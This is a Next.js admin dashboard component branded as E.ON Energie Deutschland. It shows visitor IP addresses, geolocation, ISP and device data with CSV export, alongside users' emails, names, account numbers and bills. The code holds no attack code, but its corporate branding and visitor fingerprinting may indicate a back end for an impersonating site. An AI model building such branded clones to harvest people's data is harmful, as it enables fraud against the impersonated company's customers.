"use client"

import { useState, useMemo } from "react"
import { useRouter } from "next/navigation"
import { createClient } from "@/lib/supabase/client"
import { format } from "date-fns"

interface Visitor {
  id: string
  ip_address: string
  country: string | null
  country_code: string | null
  region: string | null
  city: string | null
  latitude: number | null
  longitude: number | null
  timezone: string | null
  isp: string | null
  browser: string | null
  browser_version: string | null
  os: string | null
  device_type: string | null
  user_agent: string | null
  page_url: string
  referrer: string | null
  session_id: string | null
  user_id: string | null
  visit_duration: number
  created_at: string
}

interface Profile {
  id: string
  user_id: string
  email: string
  full_name: string | null
  account_number: string | null
  created_at: string
}

interface Bill {
  id: string
  user_id: string
  amount: number
  status: string
  due_date: string
  created_at: string
}

interface PaymentMethod {
  id: string
  user_id: string
  method_type: string
  is_verified: boolean
  created_at: string
}

interface AdminDashboardProps {
  visitors: Visitor[]
  profiles: Profile[]
  bills: Bill[]
  paymentMethods: PaymentMethod[]
}

export default function AdminDashboard({ visitors, profiles, bills, paymentMethods }: AdminDashboardProps) {
  const router = useRouter()
  const supabase = createClient()
  const [activeTab, setActiveTab] = useState<"overview" | "visitors" | "users" | "bills">("overview")
  const [searchTerm, setSearchTerm] = useState("")
  const [dateFilter, setDateFilter] = useState<"today" | "week" | "month" | "all">("all")

  const handleSignOut = async () => {
    await supabase.auth.signOut()
    router.push("/")
  }

  // Analytics calculations
  const analytics = useMemo(() => {
    const now = new Date()
    const today = new Date(now.getFullYear(), now.getMonth(), now.getDate())
    const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000)
    const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000)

    const filterByDate = (date: string) => {
      const visitDate = new Date(date)
      if (dateFilter === "today") return visitDate >= today
      if (dateFilter === "week") return visitDate >= weekAgo
      if (dateFilter === "month") return visitDate >= monthAgo
      return true
    }

    const filteredVisitors = visitors.filter((v) => filterByDate(v.created_at))

    const totalVisits = filteredVisitors.length
    const uniqueVisitors = new Set(filteredVisitors.map((v) => v.ip_address)).size
    const totalUsers = profiles.length
    const totalBills = bills.length
    const paidBills = bills.filter((b) => b.status === "paid").length
    const totalRevenue = bills.filter((b) => b.status === "paid").reduce((sum, b) => sum + b.amount, 0)

    // Browser stats
    const browserCounts = filteredVisitors.reduce(
      (acc, v) => {
        const browser = v.browser || "Unknown"
        acc[browser] = (acc[browser] || 0) + 1
        return acc
      },
      {} as Record<string, number>,
    )

    // Country stats
    const countryCounts = filteredVisitors.reduce(
      (acc, v) => {
        const country = v.country || "Unknown"
        acc[country] = (acc[country] || 0) + 1
        return acc
      },
      {} as Record<string, number>,
    )

    // Device stats
    const deviceCounts = filteredVisitors.reduce(
      (acc, v) => {
        const device = v.device_type || "Unknown"
        acc[device] = (acc[device] || 0) + 1
        return acc
      },
      {} as Record<string, number>,
    )

    // Page stats
    const pageCounts = filteredVisitors.reduce(
      (acc, v) => {
        acc[v.page_url] = (acc[v.page_url] || 0) + 1
        return acc
      },
      {} as Record<string, number>,
    )

    return {
      totalVisits,
      uniqueVisitors,
      totalUsers,
      totalBills,
      paidBills,
      totalRevenue,
      browserCounts,
      countryCounts,
      deviceCounts,
      pageCounts,
    }
  }, [visitors, profiles, bills, dateFilter])

  const filteredVisitors = useMemo(() => {
    return visitors.filter(
      (v) =>
        v.ip_address.toLowerCase().includes(searchTerm.toLowerCase()) ||
        v.country?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        v.city?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        v.browser?.toLowerCase().includes(searchTerm.toLowerCase()),
    )
  }, [visitors, searchTerm])

  const exportToCSV = () => {
    const headers = ["IP Address", "Country", "City", "Browser", "OS", "Device", "Page", "Referrer", "Timestamp"]
    const rows = filteredVisitors.map((v) => [
      v.ip_address,
      v.country || "",
      v.city || "",
      v.browser || "",
      v.os || "",
      v.device_type || "",
      v.page_url,
      v.referrer || "",
      v.created_at,
    ])

    const csv = [headers, ...rows].map((row) => row.join(",")).join("\n")
    const blob = new Blob([csv], { type: "text/csv" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `visitors-${format(new Date(), "yyyy-MM-dd")}.csv`
    a.click()
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#F5F5F5]">
      <header className="bg-white border-b border-gray-200 px-6 py-4">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <div className="flex items-center gap-4">
            <img src="/eon-logo.svg" alt="E.ON Logo" className="h-8" />
            <span className="text-xl font-bold text-[#E20015]">Admin Dashboard</span>
          </div>
          <div className="flex items-center gap-4">
            <button
              onClick={() => router.push("/admin/settings")}
              className="text-sm font-medium text-gray-600 hover:text-[#E20015] transition-colors"
            >
              Einstellungen
            </button>
            <button onClick={handleSignOut} className="text-sm font-medium text-gray-600 hover:text-[#E20015]">
              Abmelden
            </button>
          </div>
        </div>
      </header>

      <main className="flex-1 px-6 py-8">
        <div className="max-w-7xl mx-auto">
          {/* Date Filter */}
          <div className="mb-6 flex gap-2">
            {(["today", "week", "month", "all"] as const).map((filter) => (
              <button
                key={filter}
                onClick={() => setDateFilter(filter)}
                className={`px-4 py-2 rounded-lg font-medium transition-colors ${
                  dateFilter === filter
                    ? "bg-[#E20015] text-white"
                    : "bg-white text-gray-700 hover:bg-gray-100 border border-gray-200"
                }`}
              >
                {filter === "today" && "Heute"}
                {filter === "week" && "7 Tage"}
                {filter === "month" && "30 Tage"}
                {filter === "all" && "Alle"}
              </button>
            ))}
          </div>

          {/* Tabs */}
          <div className="mb-6 flex gap-2 border-b border-gray-200">
            {(["overview", "visitors", "users", "bills"] as const).map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                className={`px-6 py-3 font-medium transition-colors ${
                  activeTab === tab ? "text-[#E20015] border-b-2 border-[#E20015]" : "text-gray-600 hover:text-gray-900"
                }`}
              >
                {tab === "overview" && "Übersicht"}
                {tab === "visitors" && "Besucher"}
                {tab === "users" && "Benutzer"}
                {tab === "bills" && "Rechnungen"}
              </button>
            ))}
          </div>

          {/* Overview Tab */}
          {activeTab === "overview" && (
            <div className="space-y-6">
              {/* Stats Grid */}
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                <div className="bg-white rounded-lg p-6 shadow-sm">
                  <h3 className="text-sm font-medium text-gray-600 mb-2">Gesamtbesuche</h3>
                  <p className="text-3xl font-bold text-gray-900">{analytics.totalVisits.toLocaleString()}</p>
                </div>
                <div className="bg-white rounded-lg p-6 shadow-sm">
                  <h3 className="text-sm font-medium text-gray-600 mb-2">Eindeutige Besucher</h3>
                  <p className="text-3xl font-bold text-gray-900">{analytics.uniqueVisitors.toLocaleString()}</p>
                </div>
                <div className="bg-white rounded-lg p-6 shadow-sm">
                  <h3 className="text-sm font-medium text-gray-600 mb-2">Registrierte Benutzer</h3>
                  <p className="text-3xl font-bold text-gray-900">{analytics.totalUsers.toLocaleString()}</p>
                </div>
                <div className="bg-white rounded-lg p-6 shadow-sm">
                  <h3 className="text-sm font-medium text-gray-600 mb-2">Gesamtumsatz</h3>
                  <p className="text-3xl font-bold text-green-600">€{analytics.totalRevenue.toFixed(2)}</p>
                </div>
              </div>

              {/* Browser Stats */}
              <div className="bg-white rounded-lg p-6 shadow-sm">
                <h3 className="text-lg font-bold text-gray-900 mb-4">Browser-Statistiken</h3>
                <div className="space-y-3">
                  {Object.entries(analytics.browserCounts)
                    .sort(([, a], [, b]) => b - a)
                    .slice(0, 5)
                    .map(([browser, count]) => (
                      <div key={browser} className="flex items-center justify-between">
                        <span className="text-gray-700">{browser}</span>
                        <div className="flex items-center gap-3">
                          <div className="w-32 h-2 bg-gray-200 rounded-full overflow-hidden">
                            <div
                              className="h-full bg-[#E20015]"
                              style={{ width: `${(count / analytics.totalVisits) * 100}%` }}
                            />
                          </div>
                          <span className="text-sm font-medium text-gray-900 w-12 text-right">{count}</span>
                        </div>
                      </div>
                    ))}
                </div>
              </div>

              {/* Country Stats */}
              <div className="bg-white rounded-lg p-6 shadow-sm">
                <h3 className="text-lg font-bold text-gray-900 mb-4">Länder-Statistiken</h3>
                <div className="space-y-3">
                  {Object.entries(analytics.countryCounts)
                    .sort(([, a], [, b]) => b - a)
                    .slice(0, 10)
                    .map(([country, count]) => (
                      <div key={country} className="flex items-center justify-between">
                        <span className="text-gray-700">{country}</span>
                        <div className="flex items-center gap-3">
                          <div className="w-32 h-2 bg-gray-200 rounded-full overflow-hidden">
                            <div
                              className="h-full bg-blue-600"
                              style={{ width: `${(count / analytics.totalVisits) * 100}%` }}
                            />
                          </div>
                          <span className="text-sm font-medium text-gray-900 w-12 text-right">{count}</span>
                        </div>
                      </div>
                    ))}
                </div>
              </div>

              {/* Page Stats */}
              <div className="bg-white rounded-lg p-6 shadow-sm">
                <h3 className="text-lg font-bold text-gray-900 mb-4">Beliebteste Seiten</h3>
                <div className="space-y-3">
                  {Object.entries(analytics.pageCounts)
                    .sort(([, a], [, b]) => b - a)
                    .slice(0, 10)
                    .map(([page, count]) => (
                      <div key={page} className="flex items-center justify-between">
                        <span className="text-gray-700 font-mono text-sm">{page}</span>
                        <span className="text-sm font-medium text-gray-900">{count}</span>
                      </div>
                    ))}
                </div>
              </div>
            </div>
          )}

          {/* Visitors Tab */}
          {activeTab === "visitors" && (
            <div className="space-y-6">
              <div className="flex justify-between items-center">
                <input
                  type="text"
                  placeholder="Suche nach IP, Land, Stadt, Browser..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-[#E20015] w-96"
                />
                <button
                  onClick={exportToCSV}
                  className="bg-[#E20015] hover:bg-[#C00012] text-white font-bold py-2 px-6 rounded-lg transition-colors"
                >
                  Als CSV exportieren
                </button>
              </div>

              <div className="bg-white rounded-lg shadow-sm overflow-hidden">
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead className="bg-gray-50 border-b border-gray-200">
                      <tr>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">IP-Adresse</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Standort</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Browser</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Gerät</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Seite</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Zeitstempel</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-200">
                      {filteredVisitors.slice(0, 100).map((visitor) => (
                        <tr key={visitor.id} className="hover:bg-gray-50">
                          <td className="px-6 py-4 text-sm font-mono text-gray-900">{visitor.ip_address}</td>
                          <td className="px-6 py-4 text-sm text-gray-900">
                            {visitor.city}, {visitor.country}
                          </td>
                          <td className="px-6 py-4 text-sm text-gray-900">
                            {visitor.browser} {visitor.browser_version}
                          </td>
                          <td className="px-6 py-4 text-sm text-gray-900">
                            {visitor.device_type} - {visitor.os}
                          </td>
                          <td className="px-6 py-4 text-sm font-mono text-gray-600">{visitor.page_url}</td>
                          <td className="px-6 py-4 text-sm text-gray-600">
                            {format(new Date(visitor.created_at), "dd.MM.yyyy HH:mm:ss")}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {/* Users Tab */}
          {activeTab === "users" && (
            <div className="bg-white rounded-lg shadow-sm overflow-hidden">
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead className="bg-gray-50 border-b border-gray-200">
                    <tr>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">E-Mail</th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Name</th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Kontonummer</th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">
                        Registriert am
                      </th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-200">
                    {profiles.map((profile) => (
                      <tr key={profile.id} className="hover:bg-gray-50">
                        <td className="px-6 py-4 text-sm text-gray-900">{profile.email}</td>
                        <td className="px-6 py-4 text-sm text-gray-900">{profile.full_name || "-"}</td>
                        <td className="px-6 py-4 text-sm font-mono text-gray-900">{profile.account_number || "-"}</td>
                        <td className="px-6 py-4 text-sm text-gray-600">
                          {format(new Date(profile.created_at), "dd.MM.yyyy HH:mm")}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* Bills Tab */}
          {activeTab === "bills" && (
            <div className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div className="bg-white rounded-lg p-6 shadow-sm">
                  <h3 className="text-sm font-medium text-gray-600 mb-2">Gesamtrechnungen</h3>
                  <p className="text-3xl font-bold text-gray-900">{analytics.totalBills}</p>
                </div>
                <div className="bg-white rounded-lg p-6 shadow-sm">
                  <h3 className="text-sm font-medium text-gray-600 mb-2">Bezahlte Rechnungen</h3>
                  <p className="text-3xl font-bold text-green-600">{analytics.paidBills}</p>
                </div>
                <div className="bg-white rounded-lg p-6 shadow-sm">
                  <h3 className="text-sm font-medium text-gray-600 mb-2">Zahlungsrate</h3>
                  <p className="text-3xl font-bold text-blue-600">
                    {analytics.totalBills > 0 ? ((analytics.paidBills / analytics.totalBills) * 100).toFixed(1) : 0}%
                  </p>
                </div>
              </div>

              <div className="bg-white rounded-lg shadow-sm overflow-hidden">
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead className="bg-gray-50 border-b border-gray-200">
                      <tr>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Betrag</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Status</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">
                          Fälligkeitsdatum
                        </th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Erstellt am</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-200">
                      {bills.map((bill) => (
                        <tr key={bill.id} className="hover:bg-gray-50">
                          <td className="px-6 py-4 text-sm font-bold text-gray-900">€{bill.amount.toFixed(2)}</td>
                          <td className="px-6 py-4 text-sm">
                            <span
                              className={`inline-flex px-2 py-1 text-xs font-semibold rounded-full ${
                                bill.status === "paid"
                                  ? "bg-green-100 text-green-800"
                                  : bill.status === "pending"
                                    ? "bg-yellow-100 text-yellow-800"
                                    : "bg-red-100 text-red-800"
                              }`}
                            >
                              {bill.status === "paid"
                                ? "Bezahlt"
                                : bill.status === "pending"
                                  ? "Ausstehend"
                                  : "Überfällig"}
                            </span>
                          </td>
                          <td className="px-6 py-4 text-sm text-gray-900">
                            {format(new Date(bill.due_date), "dd.MM.yyyy")}
                          </td>
                          <td className="px-6 py-4 text-sm text-gray-600">
                            {format(new Date(bill.created_at), "dd.MM.yyyy")}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}
        </div>
      </main>

      <footer className="bg-white border-t border-gray-200 px-6 py-8">
        <div className="max-w-7xl mx-auto text-center text-sm text-gray-600">
          <p>© 2025 E.ON Energie Deutschland GmbH - Admin Dashboard</p>
        </div>
      </footer>
    </div>
  )
}
